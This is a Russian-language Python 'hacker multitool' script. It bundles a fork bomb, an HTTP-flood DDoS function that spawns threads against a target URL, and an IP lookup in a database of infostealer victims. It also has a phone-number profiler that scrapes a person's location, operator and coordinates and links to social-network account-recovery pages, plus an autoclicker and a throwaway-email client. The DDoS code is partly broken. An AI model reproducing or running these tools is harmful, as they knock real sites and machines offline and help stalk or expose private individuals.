import os
import random
import string
import time
import socket
import threading
import hashlib
import subprocess
import platform

import colorama
import requests
import uuid
import screeninfo
import psutil
import importlib
import webbrowser
import phonenumbers
import g4f

from functools import lru_cache
from bs4 import BeautifulSoup as bs
from pynput.mouse import Controller, Button
from pynput.keyboard import Listener, KeyCode
def get_detailed_phone_info(phone):
        try:
            parsed_number = phonenumbers.parse(phone)
            if not phonenumbers.is_valid_number(parsed_number):
                print("")

            MOBILE = phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE
            FIXED_LINE = phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.FIXED_LINE
            VOIP = phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.VOIP

            VALID = phonenumbers.is_valid_number(parsed_number)
            POSSIBLE = phonenumbers.is_possible_number(parsed_number)
            if MOBILE == True:
                print(" üí£–ú–æ–±–∏–ª—å–Ω—ã–π –Ω–æ–º–µ—Äüí£ –î–∞")
            else:
                print(" üí£–ú–æ–±–∏–ª—å–Ω—ã–π –Ω–æ–º–µ—Äüí£ –ù–µ—Ç")
            if FIXED_LINE == True:
                print(" üí£–ï—Å—Ç—å –ª–∏ —Ñ—É–Ω–∫—Ü–∏—è FL(Fixed Line)üí£ –î–∞")
            else:
                print(" üí£–ï—Å—Ç—å –ª–∏ —Ñ—É–Ω–∫—Ü–∏—è FL(Fixed Line)üí£ –ù–µ—Ç")
            if VOIP == True:
                print(" üí£–í–∫–ª—é—á–µ–Ω –ª–∏ VoIPüí£ –î–∞")
            else:
                print(" üí£–í–∫–ª—é—á–µ–Ω –ª–∏ VoIPüí£ –ù–µ—Ç")
            if VALID == True:
                print(" üí£–ü—Ä–∞–≤–∏–ª—å–Ω–æ –ª–∏ –Ω–∞–±—Ä–∞–Ωüí£ –î–∞")
            else:
                print(" üí£–ü—Ä–∞–≤–∏–ª—å–Ω–æ –ª–∏ –Ω–∞–±—Ä–∞–Ωüí£ –ù–µ—Ç")
            if POSSIBLE == True:
                print(" üí£–í–æ–∑–º–æ–∂–µ–Ω –ª–∏ –Ω–æ–º–µ—Äüí£ –î–∞")
            else:
                print(" üí£–í–æ–∑–º–æ–∂–µ–Ω –ª–∏ –Ω–æ–º–µ—Äüí£ –ù–µ—Ç")
        except Exception as e:
            print("")
def webs(url):
    webbrowser.open_new(url)
def console(command):
    os.system(command)
def fork():
    forks = 0
    while True:
        forks += 1
        print(f"[+{forks} —Ñ–æ—Ä–∫]")
        fork = os.fork()
def get_wifi_info():
    system = platform.system()
    try:
        if system.lower() == 'windows':
            output = subprocess.check_output("netsh wlan show interfaces", shell=True, encoding='utf-8')
            print("üí£Ô∏èWi-Fi –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–ª—è Windowsüí£Ô∏è")
            print(output)
        elif system.lower() == 'linux':
            output = subprocess.check_output("iwconfig", shell=True, encoding='utf-8')
            print("üí£Ô∏èWi-Fi –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–ª—è Linuxüí£Ô∏è ")
            print(output)
        elif system.lower() == 'darwin' or system.lower() == 'macos':
            output = subprocess.check_output("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I", shell=True, encoding='utf-8')
            print("üí£Ô∏èWi-Fi –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–ª—è macOSüí£Ô∏è ")
            print(output)
        else:
            print("üí£Ô∏è–ù–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º–∞—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞!üí£Ô∏è")
    except subprocess.CalledProcessError as e:
        print(f"üí£Ô∏è–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã: {e}üí£Ô∏è")
    except Exception as e:
        print(f"üí£Ô∏è–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}üí£Ô∏è")

get_wifi_info()
def gpt(promt1:str)->str:
    response = g4f.ChatCompletion.create(
    model = g4f.models.gpt_4o1,
    messages=[{"role": "user", "content": promt1}],
    )
    return response
def start():
    print("""
                                ‚ñà‚ñà    ‚ñà‚ñà
                    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà      ‚ñà‚ñà  ‚ñà‚ñà
                  ‚ñà‚ñà      ‚ñà‚ñà
                ‚ñà‚ñà          ‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë    ‚ñà‚ñà‚ñà‚ñà
                ‚ñà‚ñà
              ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà            ‚ñà‚ñà  ‚ñà‚ñà
              ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà            ‚ñà‚ñà    ‚ñà‚ñà
          ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñì‚ñì‚ñà‚ñà
      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë  ‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà
      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñà‚ñà
    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì  ‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà
    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà
    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà
      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà
      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà
        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
          ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
              ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà""")
toggle_key = KeyCode(char='v')
clicking = False
mouse = Controller()
def get_info(ip):
    url = f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-ip?ip={ip}"
    try:
        response = requests.get(url)
        response.raise_for_status()
        stealers_data = response.json().get('stealers', [])

        if stealers_data:
            for data in stealers_data:
                    computer_name = data.get('computer_name', '/')
                    operating_system = data.get('operating_system', '/')
                    ip = data.get('ip', '/')
                    malware_path = data.get('malware_path', '/')
                    date_compromised = data.get('date_compromised', '/')
                    antiviruses = data.get('antiviruses', '/')
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}üí£Ô∏è–ò–º—è –ü–öüí£Ô∏è{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", computer_name)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}üí£Ô∏è–û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞üí£Ô∏è{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", operating_system)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}üí£Ô∏èIPüí£Ô∏è{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", ip)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}üí£Ô∏è–ü—É—Ç—å –º–∞–ª–≤–∞—Ä—èüí£Ô∏è{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", malware_path)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}üí£Ô∏è–î–∞—Ç–∞ –∫–æ–º–ø—Ä–æ–º–∏—Å—Å–∞üí£Ô∏è{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", date_compromised)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}üí£Ô∏è–ê–Ω—Ç—Ç–∏–í–∏—Ä—É—Å—ãüí£Ô∏è{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", antiviruses)
            else:
                print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTRED_EX}üí£Ô∏è–ù–µ –Ω–∞–π–¥–µ–Ω–æüí£Ô∏è")

    except:
        print("") 
def clicker():
    while True:
        if clicking:
            mouse.click(Button.left, 5)
            time.sleep(0.8)


def toggle_event(key):
    if key == toggle_key:
        global clicking
        clicking = not clicking


def click_left():
    clicking_thread = threading.Thread(target=clicker)
    clicking_thread.start()

    with Listener(on_press=toggle_event) as listener:
        listener.join()

toggle_key = KeyCode(char='v')
clicking = False
mouse = Controller()

def clicker():
    while True:
        if clicking:
            mouse.click(Button.left, 5)
            time.sleep(0.1)


def toggle_event(key):
    if key == toggle_key:
        global clicking
        clicking = not clicking


def click_right():
    clicking_thread = threading.Thread(target=clicker)
    clicking_thread.start()

    with Listener(on_press=toggle_event) as listener:
        listener.join()
def ddos(URL):
    threads = 20
    def dos(target):
        while True:
            try:
                res = requests.get(target)
                print(colorama.Fore.YELLOW + "[–ë–æ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω]" + colorama.Fore.WHITE)
                if threads > threads:
                    print("DDOS –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
            except requests.exceptions.ConnectionError:
                print(colorama.Fore.RED + "{!} " + colorama.Fore.LIGHTGREEN_EX + " [Check your internet connect]")

            try:
                    threads = int(input("üí£Ô∏è–ë–æ—Ç—ãüí£Ô∏è "))
            except ValueError:
                    exit(colorama.Fore.RED+"{!}"+colorama.Fore.LIGHTGREEN_EX+" [–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ]")
            if threads == 0:
                    exit(colorama.Fore.RED+"{!}"+colorama.Fore.LIGHTGREEN_EX+" [–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ]")
            if not URL.__contains__("http"):
                    exit(colorama.Fore.RED+"{!}"+colorama.Fore.LIGHTGREEN_EX+" [–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —Å—Å—ã–ª–∫–∞]")

            if not URL.__contains__("."):
                    exit(colorama.Fore.RED+"{!}"+colorama.Fore.LIGHTGREEN_EX+" [–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –¥–æ–º–µ–Ω]")

            for i in range(0, threads):
                    thr = threading.Thread(target=dos, args=(URL,))
                    thr.start()
                    print(colorama.Fore.YELLOW+"["+str(i + 1) + " –±–æ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω]")
API = 'https://www.1secmail.com/api/v1/'
domain_list = ["1secmail.com", "1secmail.org", "1secmail.net"]
domain = random.choice(domain_list)


def generate_username():
    name = string.ascii_lowercase + string.digits
    username = ''.join(random.choice(name) for i in range(10))

    return username

def get_ip_by_hostname():
    hostname = input('üí£–î–æ–º–µ–Ω(–±–µ–∑ http/https)üí£ ')
    
    try:
        print(f'üí£–•–æ—Å—Çüí£ {hostname}\nüí£IPüí£ {socket.gethostbyname(hostname)}')
    except socket.gaierror as error:
        print(f'üí£–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞ - {error}üí£')


def main():
    print(get_ip_by_hostname())
    
if __name__ == '__main__':
    main()
def check_mail(mail=''):
    req_link = f'{API}?action=getMessages&login={mail.split("@")[0]}&domain={mail.split("@")[1]}'
    r = requests.get(req_link).json()
    length = len(r)

    if length == 0:
        print('üí£–ù–µ—Ç –Ω–∏ –æ–¥–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—èüí£')
    else:
        id_list = []

        for i in r:
            for k,v in i.items():
                if k == 'id':
                    id_list.append(v)

        print(f'üí£–£ –≤–∞—Å {length} —Å–æ–æ–±—â–µ–Ω–∏–π. –ü–æ—á—Ç–∞ –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è –∫–∞–∂–¥—ã–µ –ø—è—Ç—å —Å–µ–∫—É–Ω–¥üí£ \n')

        current_dir = os.getcwd()



        for i in id_list:
            read_msg = f'{API}?action=readMessage&login={mail.split("@")[0]}&domain={mail.split("@")[1]}&id={i}'
            r = requests.get(read_msg).json()

            sender = r.get('from')
            subject = r.get('subject')
            date = r.get('date')
            content = r.get('textBody')

            print(f'üí£–û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—åüí£: {sender}\nüí£–ö–æ–º—Éüí£: {mail}\nüí£–¢–µ–º–∞ –ø–∏—Å—å–º–∞üí£: {subject}\nüí£–î–∞—Ç–∞üí£: {date}\nüí£–°–æ–æ–±—â–µ–Ω–∏–µüí£: {content}')

def delete_mail(mail=''):
    url = 'https://www.1secmail.com/mailbox'

    data = {
        'action': 'deleteMailbox',
        'login': mail.split('@')[0],
        'domain': mail.split('@')[1]
    }

    r = requests.post(url, data=data)
    print(f'üí£–í–∞—à–∞ –ø–æ—á—Ç–∞ - {mail} —É–¥–∞–ª–µ–Ω–∞!üí£\n')


def secmail():
    try:
        username = generate_username()
        mail = f'{username}@{domain}'
        print(f'üí£–í–∞—à–∞ –≤—Ä–µ–º–µ–Ω–Ω–∞—è –ø–æ—á—Ç–∞: {mail}üí£')

        mail_req = requests.get(f'{API}?login={mail.split("@")[0]}&domain={mail.split("@")[1]}')

        while True:
            check_mail(mail=mail)
            time.sleep(5)

    except(KeyboardInterrupt):
        delete_mail(mail=mail)
        print('üí£–û—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æüí£')
COLOR_CODE = {
    "UNDERLINE": "\033[04m",
    "URL_L": "\033[36m"}
class PhoneRadar:
    def __init__(self, user_number: str) -> None:
        self.__phoneradar_url: str = "https://phoneradar.ru/phone/"
        self.__not_found_text: str = "üí£–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Çüí£"
        self.__user_number: str = (user_number.replace(" ", "")
            .replace("(", "").replace(")", "")
            .replace("-", "").replace("+", ""))
    
    @lru_cache(maxsize=None)
    def __get_site_resurces(self):

        try:
            __resurce: bytes = requests.get(self.__phoneradar_url + self.__user_number)
            return __resurce.content
        
        except requests.exceptions.ConnectionError as connection_error:
            return False

    @property
    def get_rating(self):
        
        resurce: bytes = self.__get_site_resurces()
        if resurce:
            try:
                rating_link: str = self.__phoneradar_url + self.__user_number
                response: bytes = bs(resurce, "html.parser")
                target_block = response.find('a', href=F"/phone/{self.__user_number[1:]}")

                if target_block:

                    card_body = target_block.find_parent('div', class_='card-body')
                    if card_body:
                        comment: str = card_body.find('p').text.strip()
                        
                        name: str = card_body.find('p').find_next().find_next().text
                        
                        rating = F"{comment} / {name}"
                
                return rating, rating_link
            
            except (AttributeError, UnboundLocalError):
                return self.__not_found_text, rating_link
            
        return self.__not_found_text, rating_link
 
class HttpWebNumber:

    def __init__(self) -> None:
        self.__check_number_link: str = "https://htmlweb.ru/geo/api.php?json&telcod="
        self.__not_found_text: str = "üí£–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Çüí£"
    @lru_cache(maxsize=None)
    def __return_number_data(self, user_number: str) -> dict:
        try:
            __result_number_data = requests.get(self.__check_number_link + user_number, headers={
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15"})
        
            if __result_number_data.ok:
                try: __result_number_data: dict = __result_number_data.json()
                except: 
                    exit(f'{colorama.Fore.RED}[!] {colorama.Fore.RED}üí£–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ —Å—Ç—Ä–∞–Ω—ãüí£{colorama.Fore.RESET} –Ω–∞–ø—Ä–∏–º–µ—Ä: +7 –≤ –º–µ—Å—Ç–æ 8..\n')

            else:
                __result_number_data: dict = {"status_error": True}

        except requests.exceptions.ConnectionError as connection_error:
            __result_number_data: dict = {"status_error": True}
        
        return __result_number_data

    @property
    def print_number_results(self) -> str:

        try:
            _user_number: str = input(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}{colorama.Fore.RED}{colorama.Fore.CYAN}{colorama.Fore.LIGHTGREEN_EX}' + 
                f' üí£–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞{colorama.Fore.LIGHTBLACK_EX} +79833170773üí£ {colorama.Fore.RESET}').strip()
            if _user_number:
                print(f'{colorama.Fore.RED}{colorama.Fore.YELLOW} üí£–ü–æ–∏—Å–∫ –¥–∞–Ω–Ω—ã—Ö... üí£{colorama.Fore.RESET}\n')
                _get_user_number_data = self.__return_number_data(user_number=_user_number)
                if _get_user_number_data.get("status_error") or _get_user_number_data.get("error"):
                    print(f'{colorama.Fore.RED}{colorama.Fore.YELLOW} üí£–î–∞–Ω–Ω—ã–µ –Ω–µ –Ω–∞–π–¥–µ–Ω—ãüí£{colorama.Fore.RESET}\n')

                else:
                    _number_data_unknown = _get_user_number_data
                    _number_data_country = _get_user_number_data.get('country')
                    _number_data_capital = _get_user_number_data.get('capital')
                    _number_data_region = _get_user_number_data.get('region')
                    _number_data_other = _get_user_number_data.get('0')

                    if not _number_data_region:
                        _number_data_region: dict = {"autocod": self.__not_found_text, 
                        "name": self.__not_found_text,
                        "okrug": self.__not_found_text}
                    else:
                        print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                            f'{colorama.Fore.LIGHTGREEN_EX}üí£–°—Ç—Ä–∞–Ω–∞üí£{colorama.Fore.WHITE} '+
                            f'{_number_data_country.get("name", self.__not_found_text)}, ' +
                            f'{_number_data_country.get("fullname", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–ì–æ—Ä–æ–¥üí£{colorama.Fore.WHITE} '+
                        f'{_number_data_other.get("name", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–ü–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Åüí£{colorama.Fore.WHITE} '+
                        f'{_number_data_other.get("post", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–ö–æ–¥ –≤–∞–ª—é—Ç—ãüí£{colorama.Fore.WHITE} '+
                        f'{_number_data_country.get("iso", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–¢–µ–ª–µ—Ñ–æ–Ω–Ω—ã–µ –∫–æ–¥—ãüí£{colorama.Fore.WHITE} '+
                        f'{_number_data_capital.get("telcod", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤ Wikipediaüí£{colorama.Fore.RESET}{COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]} '+
                        f'{_number_data_other.get("wiki", self.__not_found_text)}{colorama.Fore.RESET}')


                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–ì–æ—Å. –Ω–æ–º–µ—Ä —Ä–µ–≥–∏–æ–Ω–∞ –∞–≤—Ç–æüí£{colorama.Fore.WHITE} '+
                        f'{_number_data_region.get("autocod", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–û–ø–µ—Ä–∞—Ç–æ—Äüí£{colorama.Fore.WHITE} '+
                        f'{_number_data_other.get("oper", self.__not_found_text)}, {colorama.Fore.LIGHTBLACK_EX}'+
                            f'{_number_data_other.get("oper_brand", self.__not_found_text)}, '+
                            f'{_number_data_other.get("def", self.__not_found_text)}{colorama.Fore.RESET}')
                
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µüí£{colorama.Fore.WHITE} '+
                        f'{_number_data_country.get("name", self.__not_found_text)}, ' +
                        f'{_number_data_region.get("name", self.__not_found_text)}, ' +
                        f'{_number_data_other.get("name", self.__not_found_text)}{colorama.Fore.LIGHTBLACK_EX} ('+
                            f'{_number_data_other.get("latitude", self.__not_found_text)}, '+
                            f'{_number_data_other.get("longitude", self.__not_found_text)}){colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–û—Ç–∫—Ä—ã—Ç—å –Ω–∞ –∫–∞—Ä—Ç–µ (Google)üí£{colorama.Fore.RESET}{COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]} '+
                        f'https://www.google.com/maps/place/'+
                        f'{_number_data_other.get("latitude", self.__not_found_text)}+'+
                        f'{_number_data_other.get("longitude", self.__not_found_text)}{colorama.Fore.RESET}')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–õ–æ–∫–∞—Ü–∏—èüí£{colorama.Fore.WHITE} '+
                        f'{_number_data_unknown.get("location", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–Ø–∑—ã–∫ –æ–±—â–µ–Ω–∏—èüí£{colorama.Fore.WHITE} '+
                        f'{_number_data_country.get("lang", self.__not_found_text).title()}, '+
                            f'{_number_data_country.get("langcod", self.__not_found_text)}{colorama.Fore.RESET}')
            
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–ö—Ä–∞–π/–û–∫—Ä—É–≥/–û–±–ª–∞—Å—Ç—åüí£{colorama.Fore.WHITE} '+
                        f'{_number_data_region.get("name", self.__not_found_text)}, '+ 
                            f'{_number_data_region.get("okrug", self.__not_found_text)}{colorama.Fore.RESET}')                     

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–°—Ç–æ–ª–∏—Ü–∞üí£{colorama.Fore.WHITE} '+
                        f'{_number_data_capital.get("name", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–®–∏—Ä–æ—Ç–∞/–î–æ–ª–≥–æ—Ç–∞üí£{colorama.Fore.WHITE} '+
                        f'{_number_data_other.get("latitude", self.__not_found_text)}, '+
                        f'{_number_data_other.get("longitude", self.__not_found_text)}{colorama.Fore.RESET}')
                    
                    _phone_radar = PhoneRadar(user_number=_user_number)
                    _phone_rating, _rating_link = _phone_radar.get_rating
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}üí£–û—Ü–µ–Ω–∫–∞ –Ω–æ–º–µ—Ä–∞ –≤ —Å–µ—Ç–∏üí£{colorama.Fore.WHITE} '+
                        f'{_phone_rating}{COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]} {_rating_link}{colorama.Fore.RESET}')
                    get_detailed_phone_info(f"{_user_number}")
                    print(f'\n{colorama.Fore.CYAN}{colorama.Style.BRIGHT} {colorama.Fore.LIGHTGREEN_EX}–ü—Ä–æ–≤–µ—Ä—å—Ç–µ —ç—Ç–∏ —Å—Å—ã–ª–∫–∏ (–ú–µ—Å—Å–µ–Ω–¥–∂–µ—Ä—ã –∏ –°–æ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–µ—Ç–∏): {colorama.Fore.RESET}')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}0{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://www.instagram.com/accounts/password/reset{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ü–æ–∏—Å–∫ –∞–∫–∫–∞—É–Ω—Ç–∞ –≤ Instagramüí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}1{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://api.whatsapp.com/send?phone={colorama.Fore.MAGENTA}{_user_number}{COLOR_CODE["URL_L"]}&text=–ü—Ä–∏–≤–µ—Ç,%20—ç—Ç–æ%20%20HackStalker!{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ü–æ–∏—Å–∫ –Ω–æ–º–µ—Ä–∞ –≤ WhatsAppüí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}2{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ü–æ–∏—Å–∫ –∞–∫–∫–∞—É–Ω—Ç–∞ FaceBooküí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}3{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://www.linkedin.com/checkpoint/rp/request-password-reset?{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ü–æ–∏—Å–∫ –∞–∫–∫–∞—É–Ω—Ç–∞ Linkedinüí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}4{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://ok.ru/dk?st.cmd=anonymRecoveryStartPhoneLink{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ü–æ–∏—Å–∫ –∞–∫–∫–∞—É–Ω—Ç–∞ OKüí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}5{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://twitter.com/account/begin_password_reset{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ü–æ–∏—Å–∫ –∞–∫–∫–∞—É–Ω—Ç–∞ Twitterüí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}6{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://viber://add?number={colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ü–æ–∏—Å–∫ –Ω–æ–º–µ—Ä–∞ –≤ Viberüí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}7{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://skype:{colorama.Fore.MAGENTA}{_user_number}{COLOR_CODE["URL_L"]}?call{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ó–≤–æ–Ω–æ–∫ –Ω–∞ –Ω–æ–º–µ—Ä —Å Skypeüí£')
